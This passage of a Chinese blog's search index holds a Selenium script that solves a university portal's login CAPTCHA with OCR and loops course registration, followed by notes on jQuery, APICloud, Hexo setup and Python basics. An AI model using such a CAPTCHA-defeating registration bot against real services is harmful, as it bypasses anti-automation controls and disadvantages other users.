import webdriver from PIL import Image, ImageEnhance import pytesseract from retrying import retry my_id = input(\u0026#39;Your ID:\u0026#39;) my_pswd = input(\u0026#39;Your password:\u0026#39;) my_course_id = input(\u0026#39;ID of course you need:\u0026#39;) # my_id = \u0026#39;id\u0026#39; # my_pswd = \u0026#39;password\u0026#39; # my_course_id = \u0026#39;course id\u0026#39; print(\u0026#39;Welcome. Press \u0026lt;Ctrl+C\u0026gt; or close the browser to quit.\u0026#39;) # chromedriver.exe must be added to PATH driver = webdriver.Chrome() driver.get(\u0026#34;http://portal.ecnu.edu.cn\u0026#34;) driver.save_screenshot(\u0026#39;0.png\u0026#39;) codeImage = driver.find_element_by_id(\u0026#39;codeImage\u0026#39;) img = Image.open(\u0026#39;0.png\u0026#39;) # Adjust location \u0026amp;\u0026amp; size for img.crop() left = codeImage.location[\u0026#39;x\u0026#39;] * 1.51 top = codeImage.location[\u0026#39;y\u0026#39;] * 1.5 right = left + codeImage.size[\u0026#39;width\u0026#39;] * 1.3 bottom = top + codeImage.size[\u0026#39;height\u0026#39;] * 1.5 img = img.crop((left, top, right, bottom)) img = img.convert(\u0026#39;L\u0026#39;) img = ImageEnhance.Contrast(img).enhance(3) # Single text line with only numbers my_code = pytesseract.image_to_string(img, config=\u0026#39;--psm 7 -c tessedit_char_whitelist=0123456789\u0026#39;) driver.find_element_by_id(\u0026#39;un\u0026#39;).send_keys(my_id) driver.find_element_by_id(\u0026#39;pd\u0026#39;).send_keys(my_pswd) driver.find_element_by_name(\u0026#39;code\u0026#39;).send_keys(my_code) driver.find_element_by_class_name(\u0026#39;login_box_landing_btn\u0026#39;).click() def stop_func(attempts, delay): print(\u0026#39;Loading... Attempts: %d, Delay: %d\u0026#39; % (attempts, delay)) @retry(wait_fixed=2000, stop_func=stop_func) def click_edu(): driver.find_element_by_link_text(\u0026#39; 本科教学\u0026#39;).click() def switch_2_new_tag(): driver.switch_to.window(driver.window_handles[-1]) @retry(wait_fixed=2000, stop_func=stop_func) def click_course(): driver.find_element_by_css_selector(\u0026#39;li.li_1 a.subMenu\u0026#39;).click() @retry(wait_fixed=2000, stop_func=stop_func) def click_choose(): driver.find_elements_by_link_text(\u0026#39; 点击进入\u0026#39;)[2].click() @retry(wait_fixed=2000, stop_func=stop_func) def click_entry(): driver.find_element_by_link_text(\u0026#39; 进入选课\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026#39;).click() @retry(wait_fixed=2000, stop_func=stop_func) def click_filter(): driver.find_element_by_id(\u0026#39;electableLessonList_filter_submit\u0026#39;).click() @retry(wait_fixed=2000, stop_func=stop_func) def click_op(): driver.find_element_by_class_name(\u0026#39;lessonListOperator\u0026#39;).click() click_edu() switch_2_new_tag() click_course() click_choose() click_entry() switch_2_new_tag() while True: try: # An exception will occur if user closes the browser driver.find_element_by_name(\u0026#39;electableLesson.no\u0026#39;).send_keys(my_course_id) except: break click_filter() click_op() al = driver.switch_to.alert if al.text == \u0026#39;上限人数已满，请稍后再试\u0026#39;: al.accept() print(\u0026#39;Refreshing...\u0026#39;) driver.refresh() continue else: al.accept() print(\u0026#39;Success!\u0026#39;) break 附录 # TODO: 存储用户输入的信息，使用户不用修改代码也能一劳永逸。这涉及到密码存储的问题——不能直接存储明文，所以需要加密机制。采用 base64 之类的编码等于没加密，采用单向散列函数则无法还原成密码明文，必须用双向的（也就是严格意义上的）加密机制，由于数据量不大，DES, 3DES, AES, RSA 都是值得考虑的选择。问题是我真的需要把这个简单的脚本复杂化吗？ 虽然 PIL 被 Pillow 淘汰了，用的时候还是要 from PIL import ...。 webdriver 的选择器和 DOM 的 document.queryselector 很像，优势在于更灵活，甚至可以用 xpath，劣势嘛…… 没有 jQuery 了。 调整裁剪图片时用了 location 和 size，不知道为什么在网页上和在截图里数值上会有偏差，最后靠乱调参数才搞定。。也许是巧合，数值上正好差了 1.5 倍？ 除了用 ImageEnhance 库增加验证码正确识别率以外，还可以用图像二值化的办法。理论上来说用 pytesseract 来识别 ECNU 公共数据库的验证码实在是杀鸡用牛刀了。 不明白 pytesseract 的 config 里的参数的含义，在网上粗略找了找没啥发现，命令行里敲 --help 就出现了。还是没有养成命令行看官方文档的习惯。 关闭浏览器时会在最后的 while True 循环第一行触发 NoSuchWindowException，毕竟浏览器都被关了嘛。所以额外加了个 try...except。 ","date":"2019-02-10","permalink":"/posts/course-robber/","section":"Posts","summary":"\u003cp\u003e用来在第三轮选课中抢课。\u003c/p\u003e","title":"横行霸道：ECNU 第三轮课程掠夺者"},{"content":"开发项目时踩到的坑。\n包含 jQuery 库 # 可以下载到项目目录里通过相对路径调用，不过我更偏向于通过 cdn 来包含这些开源库：\n\u0026lt;script src=\u0026#34;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 新增元素 click 事件 # 对于通过 js 新增加到 html 中的元素，jQuery 原来的 选择器. click() 会失效。 解决方法是采用 .on() 方法绑定到 body。例如：\n$(document).on(\u0026#39;click\u0026#39;, \u0026#39;.exp\u0026#39;, function() {...}); 就相当于原来的 $('.exp').click(function() {...});。\najax 发送表单数据 # 发送表单数据（FormData）时，需要将 processData 和 contentType 设置为 false，否则无法正确传输。\n$.ajax({ method: \u0026#39;POST\u0026#39;, url: url, dataType: \u0026#39;JSON\u0026#39;, data: fData, cache: false, processData: false, contentType: false, ... }); ajax 异步修改变量值 # 由于 ajax 发送异步请求（相当于并行请求），在 ajax 的 success 方法里想要修改变量的值是比较困难的。如果想要修改变量值，一般都会设置 async: false 来强制发送同步请求，但这样也就让 ajax 失去了意义。\n退而求其次的办法是，在 ajax 里只修改全局变量，并且推迟使用被修改变量的值。\n通过循环绑定 click 事件 # 这里会遇到的问题是，所有的 click 事件都被绑定到了最后绑定的那个函数上。原因是 js 中的函数都是在调用时才被解析的。通过查阅 资料，得到的解决方法之一是采用 .each() 方法：\n$(\u0026#39;img\u0026#39;).each(function (index) { $(this).click(function () { //... }); } 这里的参数 index 表示符合选择器规则的元素的索引。例如本例中，在对应 html 中的第 3 个 \u0026lt;img\u0026gt; 标签，其 index 值就为 2。要引用索引为 index 的元素，在这里只需要 $('img').eq(index) 即可。\n","date":"2019-01-23","permalink":"/posts/jquery/","section":"Posts","summary":"\u003cp\u003e开发项目时踩到的坑。\u003c/p\u003e","title":"jQuery 踩坑记"},{"content":"不是很懂为什么 APICloud 没有官方的 VSCode 插件。\n在 APICloud 上进行开发时，有很多代码编辑器可以选择：APICloud Studio, Sublime Text, Atom, Eclipse 等等，对于这些工具，APICloud 都提供了官方的插件以方便开发与调试。然而，我最喜欢的编辑器 VSCode 却没有这样的待遇。好在 这里 提供了这样的插件，尽管它有诸多瑕疵。\n插件配置 # 按上述链接装好插件后，在 APICloud 云端创建一个 app，就能得到一个 ID，这个 ID 在部署 GitHub 时会用到。\n在本地新建一个项目的目录，用 VSCode 的文件 -\u0026gt; 打开文件夹命令打开这个目录。如果没有这一步，在后面新建项目时就会出错。\n随后就可以 Ctrl+Shift+P 并输入 apicloud，选择相应的命令了。例如可以新建一个项目模板，随后在目录下会出现一个新的目录 HelloAPICloud，包含了项目模板的所有文件。\nWifi 真机调试 # 在进行真机调试前，首先需要做一些配置。这个插件最大的瑕疵就在这里。\n文件 -\u0026gt; 首选项 -\u0026gt; 设置 -\u0026gt; 扩展 -\u0026gt;APICloud 中就能进行配置，首先是端口号，默认是 23456，可以不用改；后两个选项随意，最大的坑点在最后，一张图就能说明了：\n因为我们后面要部署到 GitHub，所以我先把所有文件转移到了新建的 widget 目录，并删除了原来的 HelloAPICloud 目录。随后，当我在这一栏输入 /widget 并启动 wifi 全量更新时，控制台却提醒我当前目录不是一个有效的 APICloud 项目。这里显示的当前目录，并不是 widget 目录，而是它的上一级，也就是项目目录。\n这就是说，我添加的这个路径没有被正确识别。为什么呢？看上图就明白了，Windows 下是使用 \\ 而不是 / 来表示目录的（后者是 Linux 的习惯），而在这一字段的提示中，却分明写着：\n放到根目录的 \u0026lsquo;/widget\u0026rsquo; 里\n……\n如上图一般配置后，先在右键菜单中启动 Wifi 服务。在此之前，手机上应已装好 AppLoader，并配置好端口号和 IP 地址。其中，端口号来自刚才的配置，默认是 23456；IP 地址的话在启动 Wifi 服务后的控制台里就可以看到。如果有多个 IP 地址，填以 192.168 开头的那个地址（或其它内网地址）。\n这样以后再进行 Wifi 全量更新或 Wifi 增量更新，手机上闪过一段进度条后，就可以看到 app 的界面了。\n关于这个插件的其它功能我还在研究中。\nGitHub 部署 # 新建个 repo。在本地的项目根目录下（和 widget 所在目录同目录）git init 并关联到远程仓库，随后和常规 GitHub 仓库的操作一样了。\n但是，我们还需要在 widget/config.xml 里，修改第二行的 widget 的 id 属性，改为刚才我们获得的 app 的 ID。并且，在 app 页面 “端开发” 的“代码”选项里，更改代码位置为 “Git 平台”，填入代码地址、用户名和密码并保存，最后打开“启用 Git 平台” 开关。这样，每次我们推送最新代码后就可以在 APICloud 上云编译了，尽管 APICloud 上无法看到你的最新推送。\n希望这篇文章不要最后也变成 “踩坑记”。\n","date":"2019-01-17","permalink":"/posts/vscode-apicloud/","section":"Posts","summary":"\u003cp\u003e不是很懂为什么 APICloud 没有官方的 VSCode 插件。\u003c/p\u003e","title":"VSCode + APICloud + GitHub 开发环境配置"},{"content":"关于这个网站是如何诞生的。\n我的博客终于从 CSDN 迁移过来了，一些太简单 / 太难的文章留在了 CSDN，只保留了一些我认为有价值的。从期末考试前到现在，这个网站搭建的我很辛苦，主要还是因为相关经验不足。\n接下来记录的是搭建博客过程中踩过的坑，也汇集了很多来自其它博客的智慧。\nGitHub Pages # 是的，我采用了比较容易的方式，也就是把博客交给 GitHub 托管。GitHub 提供的 GitHub Pages 功能实在是很良心。创建一个 repo，本地仓库里把 HTML, CSS, JS 放上去就好了。\n最初我并不了解 Hexo，所以手写了前端三件套。因为懒这个网站没有太大用处，放了几个按钮当作扩展收藏夹用。\nHexo # Hexo 是基于 Node.js 的，所以首先需要到 官网 下载并安装，这样我们就拥有了非常好用的包管理工具 npm。随后，安装 hexo 只需要 npm install -g hexo 就搞定了。\n在我们新建的用于存放网站文件的目录下 hexo init，就像 git init 一样，即可初始化网站目录。生成静态页面只需要 hexo g，实时调试使用 hexo s 后浏览器访问 localhost:4000，部署到 GitHub 只需要 hexo d。\n说到部署，由于我之前已经配置过 Git，对 Git Bash 也比较熟悉，配置 SSH Key 之类的这里不详述。但我没想到，我以为很简单的部署环节，却标志着我踩坑之旅的开端。\n部署 # 先 npm install hexo-deployer-git --save 装好插件。\n就是不看教程也能猜到，部署相关的配置就在根目录 _config.yml 中的 deploy 字段里。它长这样：\ndeploy: type: git repo: branch: master 也就是说把我的 repo 地址 https://github.com/SignorMercurio/SignorMercurio.github.io.git 填上去就好了。多亏 VS Code 提醒，我才发现 yml 的冒号后面必须要加空格。然而，当我 deploy 时，却得到了这样的错误信息：\n大概是说发送 http 请求的时候出错了，我猜原因是采用 http 方式时，需要从标准输入读取 GitHub 用户名和密码信息，而在这里没能成功从标准输入中读取。\n访问 GitHub 仓库一共就两种方式，http 不行我当然就试 SSH 了。把 repo 改成\ngit@github.com:SignorMercurio/SignorMercurio.github.io.git 就成功了。\n访问网站，便可以看到 Hexo 的经典默认主题 Landscape。此时，我不禁回想起在服务器上配置完 Nginx 后看到那个欢迎页面时的心情。随后我在 Hexo 官网上换了一个喜欢的主题。\n其实过程中还因为误装了垃圾插件 hexo-baidu-url-submit 导致奇怪的报错，网上查阅后果断卸了。\n配置 RSS # 我的主题还算良心，提供了配置 RSS 的方法。首先安装插件：npm install hexo-generator-feed --save，随后在根目录 _config.yml 中加入：\nPlugins: - hexo-generator-feed feed: type: atom path: atom.xml limit: 20 也就好了，其实没什么坑点，我也不是很在意 RSS 订阅什么的，真的会有人用这个嘛？\n配置 Mathjax # 这次被我的主题坑了。\n主题中带有 mathjax 选项，但是设置为 true 后却没用。后来知道要这样设置：\nmathjax: enable: true per_page: true 而且在每篇文章的 Front-matter 里都需要加入 mathjax: true，避免渲染没有用到公式的页面。\n当我这样做了依然没有成效时，我就知道问题一定出在源头上了。\n如果主题提供了 mathjax 支持，那么它要么是通过包含了相关文件实现的，要么是通过引用了外网上的相关文件实现的。一通乱翻后，我在主题文件夹的 layout/_partial/mathjax.ejs 中找到了罪魁祸首：\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;src=\u0026#34;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML\u0026#34;\u0026gt; 这个 src 很明显就是提供 mathjax 支持的 js 文件了（上述第二种方式），但在 mathjax 官网上看了一眼，我发现 mathjax 现在已经换用了另一个 js 文件：\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML\u0026#34;\u0026gt; 用新的地址替换掉旧的即可。\n分享功能设置 # 主题自带的 share 太丑了，showshare 又存在一启用整个页面变白的奇怪 bug，于是只好用 baidushare，意外地发现还挺好看，而且和主题风格也一致（应该是主题已经改好的吧）。\n结果这玩意儿在我后面换域名时给我带来了令人无语的麻烦。\n网站访问计数 # 感谢 不蒜子 的支持，网站访问计数的设置十分简单。在主题目录下的 _config.yml 中加入：\nvisit_counter: on: true site_visit: 极客到访数 page_visit: 本页阅读量 然后按照官网所述，在主题目录下的 layout/_partial/footer.ejs 里引入 js 脚本：\n\u0026lt;script async src=\u0026#34;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\u0026#34; \u0026gt;\u0026lt;/script\u0026gt; 随后用主题内已有的代码就可以实现访问计数了。已有的代码其实也不过是条件判断 + 两个标签的安装而已。\nGitment 搭建 # 这是最花时间的部分。虽然我很欣赏利用 issue 作为评论系统的想法和极简的设计理念，但是由于 Gitment 的 bug 和 feature 实在太多，导致我不知道在这上面踩了多少坑，我还是要吐槽一下 Gitment。搭建 Gitment 的时间可能超过了我搭建网站其它部分的时间之和。\n众所周知，广受好评的多说挂了，畅言需要网站备案，disqus 需要魔法上网。虽然还有不少其它不错的评论系统可供使用，（我以为）Gitment 应该会是一个比较简单的解决方案。\n于是跟着 Gitment 的文档，我开始动手：\ndisqus: on: false changyan: on: false gitment: on: true githubID: SignorMercurio repo: SignorMercurio.github.io client_id: client_secret: lazy: true 关掉了主题的 disqus 和 changyan 支持，使用 gitment。创建了一个 OAuth 应用 后输入了 client_id 和 client_secret。其实这个 repo 字段我就试了挺久，因为不知道要不要完整的 repo 名、带. git 的仓库访问地址还是只要仓库名；也不知道是要 http 访问还是 ssh 访问。文档里没写。如果 repo 没有写对就会出现 Error: Not Found。\n这样以后基本的 Gitment 界面已经出现在了文章底部，显示需要登录才能评论。于是我点击登录，却发现跳回到了网站首页。这时，我注意到网址内容里多了一些错误信息，于是 F12 打开开发者工具查看问题。根据错误提示信息和开发者工具里的信息，我认为这是我在某处设置的一个叫做 Callback URL 的字段出了问题。回到之前注册 OAuth 应用，找到了 Authorization callback URL 这一字段，想必就是它了。设置为网站首页的网址即可（带 https）。\n我以为分析完这个回调 URL 之后不会再遇上什么麻烦了，没想到登录后跳出了奇怪的对话框：[object ProgressEvent]，我完全不明白这是什么。在 这个 Issue 里才找到原因：原作者服务器证书过期了…… 在 ejs 源码里换了其他人搭建的服务器，问题似乎是解决了。\n最后，当我初始化评论时，有些文章成功了，有些却失败了。这不科学啊？\n显然，这说明 Gitment 的评论初始化依赖于文章的某些属性。提示信息为 Error: Validation Failed，我不太明白要验证什么，于是翻了翻 Gitment 的 Issue，果然找到了许多解决方案：有改 Gitment 源文件里的 id 的（这个也有好几种方法），有改 permalink 和 md 文件名的，有在 md 文件的 Front-matter 里添加字段的，还有一些我不是很明白原理的办法。这些方法的思想都是要把 id 缩短为 50 个字符以内以通过验证。\n先是改 id 改出了奇怪的错误后，我决定采用两者结合的办法。在主题的 layout/_partial/comments/gitment.ejs 里把 id 字段改成 window.location.pathname，原来默认是 location.href。这样用于标识文章的 id 就变成了 md 文件的路径。随后在根目录的 _config.yml 里将 permalink 字段改为 post/:title/，也就是说，每篇文章 index.html 放在 post 目录下以文章标题命名的目录里。\n而这里的 “文章标题” 其实已经是文章对应的 md 文件的名字了。也就是说，这样做以后，只需要保证 md 文件的文件名不会太长即可，而这个文件名和文章实际的标题不需要保持一致。值得注意的是，由于编码转换的原因，特殊字符（比如空格）和中文到了网址里会变成多个字符，可能是因为这个原因（加上原来的 permalink 里还有日期）导致 id 超过了 50 个字符。\nGitment 调整 # 在 这个 Issue 里发现了汉化版本，遗憾的是，这个版本的样式和我的主题风格不太相符，于是我打算下载下来放在 js 和 css 文件夹里，直接通过相对路径来引用。这样我就可以自己修改 css 了。\n因为我至今不懂的原因，直接引用那个网站上的 js 文件不会出现的中文乱码问题，在我用相对路径引用时突然出现了。由于 Gitment 汉化工作量不大，我干脆借助查找功能把乱码去掉，重新自己汉化了一遍。\n最后是调整 css 样式，因为是黑色主题，我将 Gitment 的评论和预览底色也设置为黑色，文字设置为灰色和白色，就像现在这个样子，看上去好多了。\nCSS 调整与站内搜索 # 我对这个主题的一部分样式还不是太满意，于是又调整了主题的 css，主要是让列表内的代码和行内代码样式统一。随后，在主题的 _config.yml 内添加了站内搜索功能，根据文章名搜索文章：\nsearch: path: search.json field: post 更换域名 # GitHub 十分良心地提供了 Student Pack，通过学生认证后就可以享受许多学生专有的福利，对于各种开发来说都十分方便。这里我用到了 Student Pack 中的 Namecheap 一年免费 .me 域名以及一年免费 Positive SSL 证书。下单后，需要对域名进行配置。\n点击 MANAGE 后选择 Advanced DNS，添加 Host Record。受到网上教程的误导，我添加了错误的 Host Record 导致一段时间内我的域名无法正确解析，也影响到了下面升级到 https 的操作。最终，查看了 官方帮助文档 后，才得知 GitHub Pages 的 IP 地址已经更新了…… 最终配置如下：\n然后在网站根目录下添加 CNAME 文件，就一行 signormercurio.me。\n然而这个免费的 SSL 证书我却不太会用。查阅文档后，我发现这种 SSL 证书需要我在服务器端用 Nginx 生成 CSR，然后才会受到一个含有私钥和证书的压缩包，再把它部署到服务器上。然而，我的网站托管在 GitHub Pages 上，我根本不可能到服务器端操作！\n这样一来，我觉得我的免费 SSL 证书应该是废了，真是浪费啊。看着网站左上角的 “不安全” 字样，我开始思考如何升级到 https。\n升级 https # 几经折腾，我发现我的 GitHub Pages 仓库的设置里，可以直接 Enforce HTTPS。在换域名之前就是 https，换了域名后 GitHub 当然也有办法设置 https 啊，那我之前干嘛去申请 SSL 证书？我早该想到这一点的。\n然而我在 Namecheap 上的 Host Record，当时还是错的，于是没有办法升级。按照上文方法改对后，轻轻一勾，就享受到了来自伟大的 SSL/TLS 协议的保护。\n但是这个时候，我的 baidushare 似乎不是很服气，直接罢工了。查了一下发现是因为 baidushare 不支持 https（拜托，都 2019 年了）。好在也有解决办法，来自 这个 repo。\n缺点就是每次如果需要 hexo clean，那么就必须在 hexo g 后先把 static 文件夹拖进 public 里，然后再 hexo d。不过也不算麻烦，因为并不是经常需要 hexo clean。\n2019.4.1 更新 # 换了 Material X 主题，主要是因为 black-blue 代码显示的问题。又是一番折腾。\n2019.5.16 更新 # 更新了的 Material X 主题中不再需要手动捣鼓：\nMathjax 评论功能（用 Valine 代替，Gitment 毕竟已经不再维护了） 分享功能 CSS 手动调整 站内搜索功能 升级 https 后分享功能调整 访问计数功能 这证明了使用一个处于积极维护中的主题是多么重要。\n2020.2.25 更新 # 更新至 Volantis 主题，配置上变化不太大。\n2021.10.16 更新 # 今天在修复过去的博客，正好看到了。\n更新至 Icarus 主题（忘了什么时候的事了），配置非常方便省心。\n2022.03.10 更新 # 博客框架迁移至 Hugo，更简洁更方便了，这篇文章也终于成为了历史。仔细回想，这个博客真正的核心功能需求只不过是：\n能够通过 Markdown 写作并方便地管理文章（Hugo） 能够方便地更新站点、快速部署（Hugo + GitHub Pages） HTTPS（GitHub Pages） 文章、分类、标签（Hugo）及数目统计（Hugo + 自定义） 搜索（algolia） 代码一键复制（主题） 渲染数学公式（KaTeX） banner 图片（主题） 灵活易用的 ToC（主题） 可放大的图片、图片 caption（lightgallery.js） 次要需求则有：\n渲染 mermaid（Hugo） 评论系统（Valine） 深色模式（主题） 移动端适配 （主题） 图片懒加载（lazysizes） 其他功能并没有那么需要。\n","date":"2019-01-11","permalink":"/posts/hexo/","section":"Posts","summary":"\u003cp\u003e关于这个网站是如何诞生的。\u003c/p\u003e","title":"世外桃源：Hexo 踩坑记"},{"content":"期末作业居然是写综述。。有点无聊啊。这不是 Python 教程。\n入门 # 本学期学习了 Python 语言。由于之前已经学习过 C, C++, Java（以及 VB, Pascal, 前端三件套）等较难的编程语言，Python 语言的学习没有太多挑战性。容易注意到，Python 语言最大的特点是现成的可方便调用的库很丰富，语言本身对于一些底层操作的封装也做得很好，因此常常可以看到效果相同的程序，用 Python 编写比用 C/C++（不用提 Java）要短很多。\n然而，代价是性能的大幅降低。好在常用 Python 实现的程序体量都不会太大，因此速度的问题并不突出。此外，Python 语言作为解释型语言，一旦发布程序即开源。不过如今，这恐怕并不是什么缺点了。\n首先我们学习了 Python3 的安装与配置。过程非常简单：从官网下载安装包，配好环境变量后在命令行验证即可。编写和运行 Python 程序也极其简单：课上的第一个例子便是输出 Hello World 语句。为此，老师提供了两种方法，一是 Python 交互模式下直接输入 print(‘Hello World’) 并回车；二是在一个形如 1.py 文件中输入上述语句，并在命令行中输入 python 1.py 来执行。\n一般来说，后一种方法使用较多。因此，我们需要称手的代码编辑器。老师推荐我们使用 Sublime Text 和 VS Code。实际操作中，我发现对于体积稍大一点的程序（例如上百行），使用 IDE 是更为明智的选择。因此，对于短小的代码我是用 VS Code 来编辑，而较长的代码我选择了用 PyCharm 编辑。\n在刚开始学习编程时，我曾使用记事本编辑代码——众所周知，记事本保存的文件会莫名其妙地在开头加上特殊字符，这曾使得作为初学者的我十分困惑。因此，使用记事本（甚至 Word）写代码绝对是错误的选择。\n接下来我们进入了正式的 Python 语法的学习。\n基础特性与语法规则 # 首先是带我们入门的老朋友 print() 函数。\nprint(\u0026#39;11\u0026#39;, \u0026#39;22\u0026#39;) # 11 22 print(1 + 2) # 3 print(\u0026#39;11\u0026#39;, end = \u0026#39;\u0026#39;) print(\u0026#39;22\u0026#39;, end = \u0026#39;\u0026#39;) # 1122 可以接收用逗号隔开的字符串，这些字符串输出时中间会加上 1 个空格； 可以接收数学表达式； 可以用参数 end 指定其结尾字符，默认为换行符； 与输出对应的是输入函数 input()。\nname = input(\u0026#39;Enter your name:\u0026#39;) print(\u0026#39;Hello,\u0026#39;, name) # Enter your name: # \u0026gt; Mercury # Hello, Mercury 整行读取，返回读取到的字符串； 可以拥有一个字符串作为参数，表示提示信息。 这两个函数十分简单。随后老师介绍了一些语法，与 C/C++ 重复的语法规则将不再赘述：\nPI = 3.14 print(r\u0026#39;\\n\\n\\n\u0026#39;) # (indent error) print(r\u0026#39;\\n\\n\\n\u0026#39;) # \\n\\n\\n print(\u0026#39;\u0026#39;\u0026#39; line1 line2 line3 \u0026#39;\u0026#39;\u0026#39;) 注释以 # 开头； 强制要求代码块缩进； 数据类型有整数、浮点数、字符串、布尔、空等等； 字符串：既可以用单引号又可以用双引号括起来； 字符串：引号前加 r 表示 raw，既取消转义； 字符串：'''…''' 可以表示多行字符串； 字符串是不可变类型； 布尔：只有 True/False 两个值，逻辑运算 and,or,not； 空值：None，并不是 0； 变量使用前不需要声明，变量类型不固定（动态语言）； 没有机制保证常量不被修改； / 是浮点除法、// 是整除； ** 表示乘方； 整数、浮点数没有范围限制，浮点数超出一定范围会显示 inf。 然后是一些常用函数：\nord(\u0026#39;A\u0026#39;) # 65 chr(66) # B s = \u0026#39;H e l l o\u0026#39; len(s) # 5 s.encode(\u0026#39;utf-8\u0026#39;) lst = s.split(\u0026#39;\u0026#39;) # [\u0026#39;H\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;o\u0026#39;] \u0026#39;,\u0026#39;.join(lst) # \u0026#39;H,e,l,l,o\u0026#39; print(\u0026#39;{name} does {thing}\u0026#39;.format(name=\u0026#39;s.b.\u0026#39;, thing=\u0026#39;s.th.\u0026#39;)) # s.b does s.th. print(\u0026#39;%s does it %d times\u0026#39; % (\u0026#39;s.b.\u0026#39;, 6)) # s.b. does it 6 times ord() 字符变整数编码，chr() 整数编码变字符； bytes 类型在引号前加 b，str 转 bytes 用 encode() 方法，如 s.encode('utf-8')，decode() 反之。 len() 接收一个序列（列表、元组、字符串等）参数，返回其长度； 格式化字符串：字符串内和 C 语言一样，后接 % (值 0, 值 1, 值 2…)；或用 '{0}：{1:.2f}'.format('abc', 0.254)，输出为 abc：0.25。大括号中的数字并不是必须的； 字符串. split(' ') 用空格分割字符串形成列表；','.join(列表) 用逗号连接列表形成字符串； 关于控制流：\nfor i in range(5): print(i) else: print(\u0026#39;Done\u0026#39;) # 0 # 1 # 2 # 3 # 4 # Done while True: print(\u0026#39;Reached\u0026#39;) break else: print(\u0026#39;Not reached\u0026#39;) print(\u0026#39;Done\u0026#39;) # Reached # Done 条件两边都不用括号，但右边要冒号，下面的语句块需要缩进； if-\u0026gt;elif-\u0026gt;else； while-\u0026gt;else（else 有必要吗？）； for-\u0026gt;else； for i in range(a, b)，左闭右开，range 第三个参数表示步长； break 会跳过循环的 else； 函数与模块：\ndef func(a, b=5, c=10): print(\u0026#39;a is\u0026#39;, a, \u0026#39;and b is\u0026#39;, b, \u0026#39;and c is\u0026#39;, c) func(3, 7) # a is 3 and b is 7 and c is 10 func(25, c=24) # a is 25 and b is 5 and c is 24 func(c=50, a=100) # a is 100 and b is 5 and c is 50 def add_end(L=[]): L.append(\u0026#39;END\u0026#39;) return L add_end([1, 2, 3]) # [1, 2, 3,\u0026#39;END\u0026#39;] add_end() # [\u0026#39;END\u0026#39;] add_end() # [\u0026#39;END\u0026#39;,\u0026#39;END\u0026#39;] def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum calc(1, 2, 3) # 14 calc() # 0 from math import sqrt sqrt(9) # 3 def 定义函数； global 声明全局变量； 默认参数必须指向不可变对象； 关键字参数：调用函数时，参数列表中用参数名 = 值的方式指定部分参数的值； 可变参数：*arg 表示元组，**arg 表示字典，可直接传参； 可以返回多个返回值，实际上是返回元组； 代码重用：import 库；from 库 import …； dir() 返回当前模块的名称列表，或给定参数模块的名称列表； 独立运行模块时，__name__==’__main__’； 数据结构：\nlst = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;] len(lst) # 3 lst.append(\u0026#39;d\u0026#39;) # [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;] lst.insert(1,\u0026#39;e\u0026#39;) # [\u0026#39;a\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;] lst.sort() # [\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;] lst.pop(1) # [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;] lst[0] = 11 # [11,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;] tup = (2) # 2 tup = (2,) # (2,) d = {\u0026#39;a\u0026#39;: 97, \u0026#39;b\u0026#39;: 98, \u0026#39;c\u0026#39;: 99} d[\u0026#39;b\u0026#39;] == 98 # True d[\u0026#39;c\u0026#39;] = 100 # {\u0026#39;a\u0026#39;: 97, \u0026#39;b\u0026#39;: 98, \u0026#39;c\u0026#39;: 100} \u0026#39;cc\u0026#39; in d # False d.get(\u0026#39;bb\u0026#39;, -1) # -1 d.pop(\u0026#39;c\u0026#39;) # {\u0026#39;a\u0026#39;: 97, \u0026#39;b\u0026#39;: 98} s = set([1, 1, 2, 2, 3, 3]) s.add(4) # {1, 2, 3, 4} s1 = set([1, 2, 3]) s1.remove(1) # {2, 3} s \u0026amp; s1 # {2, 3} \u0026#39;abcdefg\u0026#39;[::2] # \u0026#39;aceg\u0026#39; \u0026#39;abcdefg\u0026#39;[1:-1] # \u0026#39;bcdef\u0026#39; 列表：[] 括起来，可变，可以索引，可以用 len() 取长度; 列表：append() 追加元素（来自参数）； 列表：insert(i, s) 在索引 i 处插入元素 s； 列表：pop() 删除末尾元素，或接收参数 i 删除索引为 i 的元素； 列表：元素类型可以互不相同； 元组：( ) 括起来，不可变，可以索引； 元组：只有一个元素 1 的元组：(1,) 而不是 (1)； 字典：{} 括起来，{key0: value0, key1: value1} 形式，键值必须是不可变对象； 字典： 字典变量 [键] 来得到对应的值，或用 字典变量. get(键) 得到，get() 的第二个参数是没找到时的返回值，默认为 None； 字典：删除键值对： 字典变量. pop(键)； 集合：用一个列表初始化，无重复元素，add() 添加元素，remove() 删除元素； 集合：元素必须是不可变对象； 序列：如列表、元组、字符串，主要功能是 in 判断和切片； 切片：[-2] 倒数第 2 个；[2:] 第 2 个到最后；有冒号时左闭右开；第 2 个冒号后是步长。 随后的课程内容包括了一部分 Python 高级特性，包括迭代器、生成器、异常处理、面向对象编程、匿名函数等等。\n高级特性与 OOP # 首先，我们需要理解迭代的概念：所谓迭代，即用循环来遍历可迭代对象。判断对象是否可迭代：\nfrom collections import Iterable isinstance(\u0026#39;123\u0026#39;, Iterable) # True isinstance(123, Iterable) # False 迭代的一般形式是 for 变量 in 可迭代对象:，例如：\nd = {\u0026#39;a\u0026#39;: 97, \u0026#39;b\u0026#39;: 98, 